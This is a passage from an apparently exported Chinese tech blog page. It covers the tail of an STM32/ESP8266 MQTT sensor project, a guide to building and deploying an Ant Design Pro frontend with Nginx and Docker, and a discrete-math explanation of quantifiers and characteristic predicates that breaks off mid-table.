	ESP8266_Cmd((uint8_t*)&quot;AT+MQTTSUB=0,\&quot;&quot;  SUB_TOPIC &quot;\&quot;,0&quot;,(uint8_t*)&quot;OK&quot;,200);
	osDelay(3000);
}

void AMTHL_SendMessage(void){

	sprintf(buf,&quot;AT+MQTTPUB=0,\&quot;&quot; PUB_TOPIC &quot;\&quot;,\&quot;&quot; JSON_FORMAT  &quot;\&quot;,0,0&quot;,temperature,humidity);
	ESP8266_Cmd((uint8_t*)buf,(uint8_t*)&quot;OK&quot;,200);
	
	printf(&quot;Temp: %u degree, Humi: %u %%&quot;,temperature,humidity);
}

uint8_t AMTHL_LED_ON(void){
	if (UART2_Rx_flg){
		if(ESP8266_Check_Str(RxBuf,(uint8_t*)&quot;{\&quot;LED\&quot;:1}&quot;)){
			HAL_GPIO_WritePin(GPIOA,SIGNAL_LED,(GPIO_PinState)0); // 开灯
			return 1;
		}
	}
	return 0;
}

uint8_t AMTHL_LED_OFF(void){
	if (UART2_Rx_flg){
		if(ESP8266_Check_Str(RxBuf,(uint8_t*)&quot;{\&quot;LED\&quot;:0}&quot;)){
			HAL_GPIO_WritePin(GPIOA,SIGNAL_LED,(GPIO_PinState)1); // 关灯
			return 1;
		}
	}
	return 0;
}

</code></pre>
<h1>后记</h1>
<p>工程实践被🍐🏮训斥了......😎😎😎。</p>
<h1>本文参考</h1>
<ul>
<li><a href="https://www.bilibili.com/video/BV1Xz4y1n7Uh/?p=1">第01集 明确目标_哔哩哔哩_bilibili</a></li>
</ul>


                
            </main>

            <footer class="list-content-container">
                
                <details class="record-links" open="open">
                    <summary class="menu-title">
                        links
                        <span class="badge">9</span>
                    </summary>

                    <ul class="record-links-list">
                        
                        <li data-target-id="1401105135">
                            <a href="#1401105135">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_嵌入式);">⬤</span>
                                    
                                </span>
                                
                                <span>STM32 工程的创建 - 基于 HAL 库</span>
                                
                                <div class="record-links-context hover">
                                    <ol>
<li>C 语言基本语法</li>
<li>STM32 工程创建，详看
<ul>
<li><a href="#1813829584" title="STM32 工程的创建 - 基于寄存器或标准库" class="record-link ">STM32 工程的创建 - 基于寄存器或标准库</a></li>
<li><a href="#1401105135" title="STM32 工程的创建 - 基于 HAL 库" class="record-link highlight">STM32 工程的创建 - 基于 HAL 库</a></li>
</ul>
</li>
<li>FreeRTOS 的移植，详看
<ul>
<li><a href="#2165426052" title="STM32 移植 FreeRTOS - 基于标准库" class="record-link ">STM32 移植 FreeRTOS - 基于标准库</a></li>
<li><a href="#2115225612" title="STM32 移植 FreeRTOS - 基于 HAL 库" class="record-link ">STM32 移植 FreeRTOS - 基于 HAL 库</a></li>
</ul>
</li>
</ol>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="1545394726">
                            <a href="#1545394726">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_嵌入式);">⬤</span>
                                    
                                </span>
                                
                                <span>串口驱动程序之「发送数据」</span>
                                
                                <div class="record-links-context hover">
                                    <ol>
<li>STM32 串口 1 用于向电脑发送数据，<code>printf</code> 重写为向串口 1 发送数据。详看：<a href="#1545394726" title="串口驱动程序之「发送数据」" class="record-link highlight">串口驱动程序之「发送数据」</a></li>
<li>串口 2 用于链接 ESP8266，需要实现不定长数据的收发。详看：<a href="#2867239616" title="串口驱动程序之「不定长字符串的接收」" class="record-link ">串口驱动程序之「不定长字符串的接收」</a></li>
<li>使用 DHT11 检测环境温湿度。详看：<a href="#3298282303" title="DHT11 驱动程序" class="record-link ">DHT11 驱动程序</a></li>
<li>OLED 模块作为温湿度数据的实时显示。详看：<a href="#2349657556" title="OLED 驱动程序" class="record-link ">OLED 驱动程序</a></li>
<li>一个任务指示灯，单纯用来指示 FreeRTOS 任务有没有卡死</li>
<li>一个 LED 灯用来应答阿里云发来的数据</li>
</ol>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="1813829584">
                            <a href="#1813829584">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_嵌入式);">⬤</span>
                                    
                                </span>
                                
                                <span>STM32 工程的创建 - 基于寄存器或标准库</span>
                                
                                <div class="record-links-context hover">
                                    <ol>
<li>C 语言基本语法</li>
<li>STM32 工程创建，详看
<ul>
<li><a href="#1813829584" title="STM32 工程的创建 - 基于寄存器或标准库" class="record-link highlight">STM32 工程的创建 - 基于寄存器或标准库</a></li>
<li><a href="#1401105135" title="STM32 工程的创建 - 基于 HAL 库" class="record-link ">STM32 工程的创建 - 基于 HAL 库</a></li>
</ul>
</li>
<li>FreeRTOS 的移植，详看
<ul>
<li><a href="#2165426052" title="STM32 移植 FreeRTOS - 基于标准库" class="record-link ">STM32 移植 FreeRTOS - 基于标准库</a></li>
<li><a href="#2115225612" title="STM32 移植 FreeRTOS - 基于 HAL 库" class="record-link ">STM32 移植 FreeRTOS - 基于 HAL 库</a></li>
</ul>
</li>
</ol>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="2115225612">
                            <a href="#2115225612">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_嵌入式);">⬤</span>
                                    
                                </span>
                                
                                <span>STM32 移植 FreeRTOS - 基于 HAL 库</span>
                                
                                <div class="record-links-context hover">
                                    <ol>
<li>C 语言基本语法</li>
<li>STM32 工程创建，详看
<ul>
<li><a href="#1813829584" title="STM32 工程的创建 - 基于寄存器或标准库" class="record-link ">STM32 工程的创建 - 基于寄存器或标准库</a></li>
<li><a href="#1401105135" title="STM32 工程的创建 - 基于 HAL 库" class="record-link ">STM32 工程的创建 - 基于 HAL 库</a></li>
</ul>
</li>
<li>FreeRTOS 的移植，详看
<ul>
<li><a href="#2165426052" title="STM32 移植 FreeRTOS - 基于标准库" class="record-link ">STM32 移植 FreeRTOS - 基于标准库</a></li>
<li><a href="#2115225612" title="STM32 移植 FreeRTOS - 基于 HAL 库" class="record-link highlight">STM32 移植 FreeRTOS - 基于 HAL 库</a></li>
</ul>
</li>
</ol>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="2165426052">
                            <a href="#2165426052">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_嵌入式);">⬤</span>
                                    
                                </span>
                                
                                <span>STM32 移植 FreeRTOS - 基于标准库</span>
                                
                                <div class="record-links-context hover">
                                    <ol>
<li>C 语言基本语法</li>
<li>STM32 工程创建，详看
<ul>
<li><a href="#1813829584" title="STM32 工程的创建 - 基于寄存器或标准库" class="record-link ">STM32 工程的创建 - 基于寄存器或标准库</a></li>
<li><a href="#1401105135" title="STM32 工程的创建 - 基于 HAL 库" class="record-link ">STM32 工程的创建 - 基于 HAL 库</a></li>
</ul>
</li>
<li>FreeRTOS 的移植，详看
<ul>
<li><a href="#2165426052" title="STM32 移植 FreeRTOS - 基于标准库" class="record-link highlight">STM32 移植 FreeRTOS - 基于标准库</a></li>
<li><a href="#2115225612" title="STM32 移植 FreeRTOS - 基于 HAL 库" class="record-link ">STM32 移植 FreeRTOS - 基于 HAL 库</a></li>
</ul>
</li>
</ol>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="2349657556">
                            <a href="#2349657556">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_嵌入式);">⬤</span>
                                    
                                </span>
                                
                                <span>OLED 驱动程序</span>
                                
                                <div class="record-links-context hover">
                                    <ol>
<li>STM32 串口 1 用于向电脑发送数据，<code>printf</code> 重写为向串口 1 发送数据。详看：<a href="#1545394726" title="串口驱动程序之「发送数据」" class="record-link ">串口驱动程序之「发送数据」</a></li>
<li>串口 2 用于链接 ESP8266，需要实现不定长数据的收发。详看：<a href="#2867239616" title="串口驱动程序之「不定长字符串的接收」" class="record-link ">串口驱动程序之「不定长字符串的接收」</a></li>
<li>使用 DHT11 检测环境温湿度。详看：<a href="#3298282303" title="DHT11 驱动程序" class="record-link ">DHT11 驱动程序</a></li>
<li>OLED 模块作为温湿度数据的实时显示。详看：<a href="#2349657556" title="OLED 驱动程序" class="record-link highlight">OLED 驱动程序</a></li>
<li>一个任务指示灯，单纯用来指示 FreeRTOS 任务有没有卡死</li>
<li>一个 LED 灯用来应答阿里云发来的数据</li>
</ol>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="2777136240">
                            <a href="#2777136240">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_嵌入式);">⬤</span>
                                    
                                </span>
                                
                                <span>ESP8266 烧写 AT MQTT 固件</span>
                                
                                <div class="record-links-context hover">
                                    <p>首先，固件烧录部分详看：<a href="#2777136240" title="ESP8266 烧写 AT MQTT 固件" class="record-link highlight">ESP8266 烧写 AT MQTT 固件</a>。</p>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="2867239616">
                            <a href="#2867239616">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_嵌入式);">⬤</span>
                                    
                                </span>
                                
                                <span>串口驱动程序之「不定长字符串的接收」</span>
                                
                                <div class="record-links-context hover">
                                    <ol>
<li>STM32 串口 1 用于向电脑发送数据，<code>printf</code> 重写为向串口 1 发送数据。详看：<a href="#1545394726" title="串口驱动程序之「发送数据」" class="record-link ">串口驱动程序之「发送数据」</a></li>
<li>串口 2 用于链接 ESP8266，需要实现不定长数据的收发。详看：<a href="#2867239616" title="串口驱动程序之「不定长字符串的接收」" class="record-link highlight">串口驱动程序之「不定长字符串的接收」</a></li>
<li>使用 DHT11 检测环境温湿度。详看：<a href="#3298282303" title="DHT11 驱动程序" class="record-link ">DHT11 驱动程序</a></li>
<li>OLED 模块作为温湿度数据的实时显示。详看：<a href="#2349657556" title="OLED 驱动程序" class="record-link ">OLED 驱动程序</a></li>
<li>一个任务指示灯，单纯用来指示 FreeRTOS 任务有没有卡死</li>
<li>一个 LED 灯用来应答阿里云发来的数据</li>
</ol>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="3298282303">
                            <a href="#3298282303">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_嵌入式);">⬤</span>
                                    
                                </span>
                                
                                <span>DHT11 驱动程序</span>
                                
                                <div class="record-links-context hover">
                                    <ol>
<li>STM32 串口 1 用于向电脑发送数据，<code>printf</code> 重写为向串口 1 发送数据。详看：<a href="#1545394726" title="串口驱动程序之「发送数据」" class="record-link ">串口驱动程序之「发送数据」</a></li>
<li>串口 2 用于链接 ESP8266，需要实现不定长数据的收发。详看：<a href="#2867239616" title="串口驱动程序之「不定长字符串的接收」" class="record-link ">串口驱动程序之「不定长字符串的接收」</a></li>
<li>使用 DHT11 检测环境温湿度。详看：<a href="#3298282303" title="DHT11 驱动程序" class="record-link highlight">DHT11 驱动程序</a></li>
<li>OLED 模块作为温湿度数据的实时显示。详看：<a href="#2349657556" title="OLED 驱动程序" class="record-link ">OLED 驱动程序</a></li>
<li>一个任务指示灯，单纯用来指示 FreeRTOS 任务有没有卡死</li>
<li>一个 LED 灯用来应答阿里云发来的数据</li>
</ol>

                                </div>
                                
                            </a>
                        </li>
                        
                    </ul>
                </details>
                

                
            </footer>
        </article>
        
        <article id="1032806896" class="record">
            <header>
                <h1 class="record-title">Ant Design Pro 前端项目初始化到部署上线</h1>

                

                

                <div class="record-type">
                    <span>types :</span>
                    <span>undefined</span>
                </div>

                
                <div class="record-tags">
                    <span>keywords :</span>
                    
                    <button class="btn" onclick="activeTag('阿里巴巴');">阿里巴巴</button>
                    
                    <button class="btn" onclick="activeTag('前端');">前端</button>
                    
                    <button class="btn" onclick="activeTag('Ant Design');">Ant Design</button>
                    
                    <button class="btn" onclick="activeTag('umijs');">umijs</button>
                    
                    <button class="btn" onclick="activeTag('npm');">npm</button>
                    
                    <button class="btn" onclick="activeTag('yarn');">yarn</button>
                    
                    <button class="btn" onclick="activeTag('cnpm');">cnpm</button>
                    
                    <button class="btn" onclick="activeTag('tyarn');">tyarn</button>
                    
                    <button class="btn" onclick="activeTag('蚂蚁金服');">蚂蚁金服</button>
                    
                    <button class="btn" onclick="activeTag('React');">React</button>
                    
                    <button class="btn" onclick="activeTag('Nginx');">Nginx</button>
                    
                    <button class="btn" onclick="activeTag('Linux');">Linux</button>
                    
                </div>
                

                
                <div class="record-begin">
                    <span>Begin :</span>
                    <span>4/11/2024</span>
                </div>
                

                

                
                <div class="record-cover">
                    <span>cover :</span>
                    <span>https://cdn.gallery.uuanqin.top/img/20240410234822.webp</span>
                </div>
                
                <div class="record-description">
                    <span>description :</span>
                    <span>备忘一下 Ant Design Pro 上线关键流程</span>
                </div>
                
                <div class="record-abbrlink">
                    <span>abbrlink :</span>
                    <span>3d8f61f0</span>
                </div>
                
                <div class="record-top_img">
                    <span>top_img :</span>
                    <span></span>
                </div>
                
            </header>

            <main class="record-content">
                <h1>初始化</h1>
<blockquote>
<p>[!warning] 搭建方法随时可能更新，请注意查看最新官网相关文档</p>
</blockquote>
<p>Ant Design Pro 是基于 Ant Design 和 umi 的封装的一整套企业级中后台前端/设计解决方案。</p>
<p>官网：<a href="https://pro.ant.design/zh-CN/docs/getting-started/">pro.ant.design/zh-CN/docs/getting-started/</a></p>
<p>一些准备：</p>
<ul>
<li>前端开发工具可以使用 vscode，或 WebStorm。</li>
<li>yarn：<a href="https://yarn.nodejs.cn/en/docs/install#windows-stable">安装 | Yarn 中文网 (nodejs.cn)</a>。yarn 是并行的 npm。一句话：<code>npm install --global yarn</code></li>
</ul>
<p>由于国内网络和前端的特殊性，在安装依赖等方面可能会失败或导致无法启动，浪费大量的时间，因此 Ant Design 推荐使用 <a href="https://www.npmjs.com/package/tyarn">tyarn - npm (npmjs.com)</a> 及 <a href="https://www.npmjs.com/package/cnpm">cnpm - npm (npmjs.com)</a> 工具。</p>
<p>主要搭建指令：</p>
<pre><code class="language-shell">npm i @ant-design/pro-cli -g   # 全局安装
pro create myapp               # 在项目文件夹下使用，myapp为项目名
</code></pre>
<blockquote>
<p>[!error] 一个可能遇到的问题<br>
/usr/local/lib/node_modules/@ant-design/pro-cli/src/create/generators/ant-design-pro/index.js:10<br>
const sortPackage = require('sort-package-json');<br>
Error [ERR_REQUIRE_ESM]: require() of ES Module</p>
<p>解决方法：<br>
进入 <code>@ant-design/pro-cli</code> 全局安装目录（一般在 <code>C:\Users\yourname\AppData\Roaming\npm\node_modules\@ant-design\pro-cli</code>）中执行 <code>npm i sort-package-json@1.55.0 -D</code>（如果初始化失败则 <code>npm cache clean --force</code>）。</p>
</blockquote>
<p>下载完成后终端输入：</p>
<pre><code class="language-shell">yarn # 如果可以的话，是 tyarn。如果还出错，再试试 cnpm install
</code></pre>
<p>项目目录可看到生成好的依赖包：<code>node_modules</code></p>
<p>注意：脚手架工具生成了项目后</p>
<ul>
<li>不要改动任何代码，先保证项目能运行</li>
<li>确认环境是否匹配、安装项目依赖</li>
</ul>
<pre><code class="language-sh">yarn run start # 你可以看看package.json里的script，以模拟数据的方式运行
# npm run start也行
</code></pre>
<p>注意使用 F12 及时看错误。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240410232133.webp" alt="image.png|500"></p>
<blockquote>
<p>react 是对 js 的一层封装，而 umi 是对 react 的进一步封装。</p>
</blockquote>
<h2>【可选】Ant Design Pro 项目瘦身</h2>
<blockquote>
<p>[!hint] 项目瘦身过程中，每做一步就运行测试</p>
</blockquote>
<p>移除国际化模块（国际化集成了多种语言，如无国际化需求可以删掉）：<code>npm run i18n-remove</code>。这个脚本将会尝试删除项目中所有的 i18n 代码，对于复杂的运行时代码，表现并不好，慎用。</p>
<p>然后自己手动删掉 <code>/src/locales</code> 文件夹。</p>
<p>一些解决方案：</p>
<ul>
<li><a href="https://github.com/ant-design/ant-design-pro/issues/11143">移除国际化出现SyntaxError: Export 'SelectLang' is not defined. (11:55) · Issue #11143</a>。把项目根目录下 <code>src/components/index.js</code> 中的 <code>SelectLang</code> 变量删除后就行。</li>
<li><a href="https://github.com/ant-design/ant-design-pro/issues/10452">🐛 BUG执行删除国际化命令报错 · Issue #10452 · ant-design/ant-design-pro (github.com)</a></li>
<li>左侧导航栏不显示问题：移除国际化后，项目左侧导航栏菜单和右上角退出登陆按钮不显示了。解决方法：给 <code>/config/route.ts</code> 配置文件的每一个路由都加上对应的 name 属性，如果不添加 name 属性，则菜单默认展示的是 path 属性。这里一定要给每一个路由都添加对应的 name 属性，不然导航栏还是不显示。</li>
</ul>
<p>其它文件的删除（不同版本下的操作略有不同）：</p>
<ul>
<li>移除测试工具：<code>/tests</code></li>
<li>（在老版本中出现）移除 e2e（自动化测试）：删除 <code>src/e2e</code> 文件夹</li>
<li>（在老版本中出现）移出自动化测试框架 <code>playwright.config.ts</code></li>
<li>移除默认页面时记得删掉路由</li>
<li>移除 <code>/src/services/swagger</code> 接口文档工具</li>
</ul>
<h2>【可选但不推荐】Umi UI 加速开发</h2>
<blockquote>
<p>[!warning] 目前不再推荐使用 Umi UI 组件</p>
</blockquote>
<p>只有框架的 V3 版本支持悬浮的 Umi UI 按钮：</p>
<pre><code class="language-sh">npm i @ant-design/pro-cli@3.1.0 -g
pro -v # 查看当前安装的版本
</code></pre>
<p>旧版本脚手架：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240410233405.webp" alt="image.png"></p>
<pre><code class="language-sh">yarn add @umijs/preset-ui -D
</code></pre>
<h1>多环境</h1>
<p>关键的环境变量：</p>
<pre><code class="language-js">process.env.NODE_ENV
// 'development', 'production'
</code></pre>
<h1>构建</h1>
<p>执行构建命令：</p>
<pre><code class="language-sh">npm run build
</code></pre>
<p>构建生成的文件在文件夹 <code>/dist</code> 中。</p>
<h1>部署</h1>
<h2>本地部署</h2>
<blockquote>
<p><a href="https://www.npmjs.com/package/serve">serve</a> 工具可以在本地启动一个静态文件服务器。如果你需要将网站部署到正式环境，可以使用 Vercel 进行部署。</p>
</blockquote>
<p>安装 serve 工具：</p>
<pre><code class="language-sh">npm install serve -g # 全局安装
</code></pre>
<p>进入生成的文件夹 <code>/dist</code> 中，执行：</p>
<pre><code class="language-sh">/dist&gt; serve

   ┌──────────────────────────────────────────┐
   │                                          │
   │   Serving!                               │
   │                                          │
   │   - Local:    http://localhost:3000      │
   │   - Network:  http://192.168.30.1:3000   │
   │                                          │
   │   Copied local address to clipboard!     │
   │                                          │
   └──────────────────────────────────────────┘
</code></pre>
<h2>Nginx 部署</h2>
<blockquote>
<p>Linux+Nginx</p>
</blockquote>
<p>将文件夹 <code>/dist</code> 压缩成包 <code>dist.zip</code> 上传到服务器。</p>
<pre><code class="language-sh"># 解压文件
unzip dist.zip -d myapp
# 把dist内容移出一层
cd myapp/dist
mv * ../
cd ..
rm -rf dist
</code></pre>
<p>假设 myapp 文件夹目录位置为：<code>/var/www/temp_test/myapp</code>。Nginx 配置文件的写法为：</p>
<pre><code>server{
	server_name	projects.uuanqin.top; # 域名
	# 前端
	location / {
		root /var/www/temp_test/myapp;
		index	index.html	index.htm;
	}
}
</code></pre>
<p>上面是配置文件关键内容写法，端口号什么的自行补充。上面的配置可以使用 certbot 工具启用 HTTPS。详看：<a href="#1867823418" title="Linux 服务器 HTTPS 的配置" class="record-link ">Linux 服务器 HTTPS 的配置</a>。</p>
<p>重启 Nginx：</p>
<pre><code class="language-sh">systemctl restart nginx
# 或 service nginx restart
</code></pre>
<p>完成登录。</p>
<h2>Docker 容器部署</h2>
<p>项目源码中新建一个文件夹 <code>docker</code> 用于存放构建 Docker 需要的相关文件。</p>
<p>在文件夹 <code>docker</code> 中新建 <code>nginx.conf</code>：</p>
<pre><code>server {
    listen 80;
    # gzip config
    gzip on;
    gzip_min_length 1k;
    gzip_comp_level 9;
    gzip_types text/plain text/css text/javascript application/json application/javascript application/x-javascript application/xml;
    gzip_vary on;
    gzip_disable &quot;MSIE [1-6]\.&quot;;
    root /usr/share/nginx/html;
    include /etc/nginx/mime.types;

	# 如果用户访问某个网页找不到的话就降级尝试访问index.html
    location / {
        try_files $uri /index.html;
    }
}
</code></pre>
<p>项目源码根目录中新建 Dockerfile：</p>
<pre><code class="language-dockerfile">FROM nginx

# 指定工作目录
WORKDIR /usr/share/nginx/html/

# 【可选】指定用户
USER root

# 把我们的配置文件复制到服务器Nginx的配置文件中
COPY ./docker/nginx.conf /etc/nginx/conf.d/

COPY ./dist  /usr/share/nginx/html/

# 【可选】显示指定端口
EXPOSE 80

CMD [&quot;nginx&quot;, &quot;-g&quot;, &quot;daemon off;&quot;]

</code></pre>
<p>Docker 构建：</p>
<pre><code class="language-sh"># 前端
docker build -t myapp:v0.0.1 .
</code></pre>
<p>Docker 运行：</p>
<pre><code class="language-sh"># 前端
docker run -p 1122:80 -d myapp:v0.0.1 # 主机端口改一下比如1122，80可能会被占用；-d 表示后台运行
</code></pre>
<p>那么服务器上的 nginx 增加以下配置，以将请求转发到 1122 端口。比如我的设置为，访问 <code>projects.uuanqin.top</code> 请求时将进行转发。</p>
<pre><code>server{
	server_name	projects.uuanqin.top;
	# 前端
	location / {
		proxy_pass http://localhost:1122;
	}
}
</code></pre>
<p>上面是配置文件关键内容写法，端口号什么的自行补充。上面的配置可以使用 certbot 工具启用 HTTPS。详看：<a href="#1867823418" title="Linux 服务器 HTTPS 的配置" class="record-link ">Linux 服务器 HTTPS 的配置</a>。</p>
<p>浏览器访问：<code>projects.uuanqin.top</code> 即可打开前端应用。</p>
<p>附 docker 常用命令：</p>
<pre><code class="language-sh">docker ps # 查看运行的镜像
docker kill &lt;CONTAINER...&gt; # 杀死运行中的容器
docker logs &lt;CONTAINER&gt; # 追踪容器的日志输出
docker images # 查看镜像
docker rmi -f IMAGE [IMAGE...] # 移除镜像
</code></pre>
<h1>本文参考</h1>
<ul>
<li><a href="https://pro.ant.design/zh-CN/docs/getting-started/">开始使用 - Ant Design Pro</a></li>
<li><a href="https://github.com/ant-design/ant-design-pro/issues/10505">🐛 [BUG]pro create myapp fail · Issue #10505 · ant-design/ant-design-pro (github.com)</a></li>
<li><a href="https://yuyuanweb.feishu.cn/wiki/DclswHMhkiRXckkWve1ckXTonDh">知识星球·编程导航 - 用户中心系统</a></li>
</ul>


                
            </main>

            <footer class="list-content-container">
                
                <details class="record-links" open="open">
                    <summary class="menu-title">
                        links
                        <span class="badge">1</span>
                    </summary>

                    <ul class="record-links-list">
                        
                        <li data-target-id="1867823418">
                            <a href="#1867823418">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_undefined);">⬤</span>
                                    
                                </span>
                                
                                <span>Linux 服务器 HTTPS 的配置</span>
                                
                                <div class="record-links-context hover">
                                    <p>上面是配置文件关键内容写法，端口号什么的自行补充。上面的配置可以使用 certbot 工具启用 HTTPS。详看：<a href="#1867823418" title="Linux 服务器 HTTPS 的配置" class="record-link highlight">Linux 服务器 HTTPS 的配置</a>。</p>

                                </div>
                                
                            </a>
                        </li>
                        
                    </ul>
                </details>
                

                
                <details class="record-backlinks" open="open">
                    <summary class="menu-title">
                        backlinks
                        <span class="badge">1</span>
                    </summary>

                    <ul class="record-backlinks-list">
                        
                        <li data-target-id="2985240736">
                            <a href="#2985240736">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_java);">⬤</span>
                                    
                                </span>
                                
                                <span>SpringBoot 项目的上线方式</span>
                                
                                <div class="record-links-context hover">
                                    <blockquote>
<p>前端项目部署方式可看：<a href="#1032806896" title="Ant Design Pro 前端项目初始化到部署上线" class="record-link highlight">Ant Design Pro 前端项目初始化到部署上线</a></p>
</blockquote>

                                </div>
                                
                            </a>
                        </li>
                        
                    </ul>
                </details>
                
            </footer>
        </article>
        
        <article id="2214581713" class="record">
            <header>
                <h1 class="record-title">为什么个体域变化引入特性谓词时，不同量词的命题变化不一样？</h1>

                

                

                <div class="record-type">
                    <span>types :</span>
                    <span>数学与算法</span>
                </div>

                
                <div class="record-tags">
                    <span>keywords :</span>
                    
                    <button class="btn" onclick="activeTag('离散数学');">离散数学</button>
                    
                    <button class="btn" onclick="activeTag('谓词逻辑');">谓词逻辑</button>
                    
                </div>
                

                
                <div class="record-begin">
                    <span>Begin :</span>
                    <span>4/12/2024</span>
                </div>
                

                

                
                <div class="record-description">
                    <span>description :</span>
                    <span>对于全称量词，特性谓词常作为蕴含的前件；对于存在量词，特性谓词常作为合取项。</span>
                </div>
                
                <div class="record-abbrlink">
                    <span>abbrlink :</span>
                    <span>83ffd5d1</span>
                </div>
                
                <div class="record-cover">
                    <span>cover :</span>
                    <span>https://cdn.gallery.uuanqin.top/img/20240412231559.webp</span>
                </div>
                
                <div class="record-top_img">
                    <span>top_img :</span>
                    <span></span>
                </div>
                
            </header>

            <main class="record-content">
                <blockquote>
<p>[!success] 这是本博客公开发表的第 100 篇文章🎉🎉</p>
</blockquote>
<p>开篇先记用到的真值表：</p>
<table>
<thead>
<tr>
<th>P</th>
<th>Q</th>
<th>合取 $P\wedge Q$</th>
<th>蕴含 $P\to Q$</th>
</tr>
</thead>
<tbody>
<tr>
<td>0</td>
<td>0</td>
<td>0</td>
<td>1</td>
</tr>
<tr>
<td>0</td>
<td>1</td>
<td>0</td>
<td>1</td>
</tr>
<tr>
<td>1</td>
<td>0</td>
<td>0</td>
<td><strong>0</strong></td>
</tr>
<tr>
<td>1</td>
<td>1</td>
<td>1</td>
<td>1</td>
</tr>
</tbody>
</table>
<h1>例子引入</h1>
<p>在<strong>个体域</strong>分别限制为（a）和（b）条件时，将下列两个命题符号化 [^42]。</p>
<ol>
<li>凡人都呼吸。</li>
<li>有的人用左手写字。</li>
</ol>
<p>其中，</p>
<p>(a) 个体域 D1 为人类集合；</p>
<p>(b) 个体域 D2 为全总个体域。</p>
<p>请思考后作答。</p>
<blockquote>
<p>[!example] 例题答案<br>
(a) 令 F(x)：x 呼吸，G(x)：x 用左手写字。</p>
<ol>
<li>$\forall x F(x)$</li>
<li>$\exists xG(x)$</li>
</ol>
<p>(b) 引入<strong>特性谓词</strong>M(x)：x 是人。</p>
<ol>
<li>$\forall x(M(x)\to F(x))$</li>
<li>$\exists x (M(x)\wedge G(x))$</li>
</ol>
</blockquote>
<p>为什么不同的量词在个体域变为总个体域时，命题需要作出这样的变化？又为什么不是反过来的，比如存在量词变化为蕴含的形式，全称量词变化为合取的形式？</p>
<p>[^42]: 屈婉玲《离散数学》第二版例 4.2</p>
<h1>课本描述</h1>
<p>不同课本在提到这个知识点时的表述如下。</p>
<p>左孝凌等人主编的《离散数学》这样写到 [^zxl]：</p>
<blockquote>
<p>使用总个体域后，对每一个客体变元的变化范围，用特性谓词加以限制。一般有：</p>
<ul>
<li>对于全称量词，特性谓词常作为蕴含的前件</li>
<li>对于存在量词，特性谓词常作为合取项</li>
</ul>
</blockquote>
<p>屈婉玲等人主编的《离散数学》第 2 版中，针对这道例题有相应的说明 [^qwl]：</p>
<blockquote>
<ul>
<li>如果 (b)1.答案为 $\forall x(M(x)\wedge F(x))$，这是不对的。若将它翻译成自然语言，则应该是“宇宙间的所有个体都是人并且都呼吸”，这显然与原义不符。</li>
<li>如果 (b)2.答案为 $\exists x(M(x)\to G(x))$，这也是不对的。将它翻译成自然语言应该为“在宇宙间存在个体,如果这个体是人,则他用左手写字”,这显然也不符合原意。</li>
</ul>
</blockquote>
<p>不管你读到那本书，如果对两个 Ling🔔 的解释还有迷惑可继续往下阅读思考。</p>
<p>[^zxl]: 相应课本第 59 页。<br>
[^qwl]: 相应课本第 62-63 页。</p>
<h1>思考讨论</h1>
<p>首先，没有人规定必须是这样转换的。转换的最终根据还是在于是否符合原句句意。</p>
<p>其实在我们说话的语境中，就有一些<strong>逻辑上的暗示</strong>（或者说<strong>隐含的意思</strong>）：</p>
<ol>
<li>当我们说「所有的人都呼吸」时，就有以下暗示：对于宇宙一切物体，<strong>如果</strong>个体是人，<strong>则</strong>他呼吸。那我们的意思就是：<br>
a. 不管宇宙有没有「人👨」，我们都认为命题正确。宇宙没有「人👨」，全称量词不关心，但只要有「人👨」，就必须呼吸。比如一个外星人👽说：「所有的人👨都呼吸」，假设宇宙根本没有「人👨」这个生物，但我们依然认为外星人👽说的没有错。</li>
<li>当我们说「有的人用左手写字」时，就有以下暗示：在宇宙间存在这样的个体，它是人，<strong>且</strong>用左手写字。那我们的意思就是：<br>
a. 必须存在一个人，且这个人用左手写字。命题才为真。<br>
b. 宇宙中有人，但是这些人都不用右手写字。命题为假。<br>
c. 宇宙中连「人」都不存在。命题为假。<strong>因为「有的人」包含了「必须要有人」的意思。</strong><br>
d. 外星生物用右爪写字。这和我们的表述无关且不符。命题为假。</li>
</ol>
<p>对于以上两个命题，我们将正确转换以及错误转换的真值列在一起供理解：</p>
<table>
<thead>
<tr>
<th>凡人都呼吸</th>
<th>M(x)</th>
<th>F(x)</th>
<th>表达式真值</th>
<th>我们认为应该的真值</th>
<th>解释</th>
</tr>
</thead>
<tbody>
<tr>
<td>$\forall x(M(x)\to F(x))$</td>
<td>0</td>
<td>x</td>
<td>1</td>
<td>1</td>
<td>如果不是人。我们也认为「凡人都呼吸」命题正确，属于善意推导，符合我们的理解。</td>
</tr>
<tr>
<td></td>
<td>1</td>
<td>0</td>
<td>0</td>
<td>0</td>
<td>只有这种情况，「凡人都呼吸」为假命题。</td>
</tr>
<tr>
<td></td>
<td>1</td>
<td>1</td>
<td>1</td>
<td>1</td>
<td>理所当然。</td>
</tr>
<tr>
<td>$\forall x(M(x)\wedge F(x))$</td>
<td>1</td>
<td>1</td>
<td>1</td>
<td>1</td>
<td></td>
</tr>
<tr>
<td></td>
<td>0</td>
<td>x</td>
<td><strong>0</strong></td>
<td><strong>1</strong></td>
<td>宇宙中没有人，但表达式为假。<strong>这违背 a.的讨论。</strong></td>
</tr>
<tr>
<td></td>
<td>1</td>
<td>0</td>
<td>0</td>
<td>0</td>
<td></td>
</tr>
</tbody>
</table>
<blockquote>
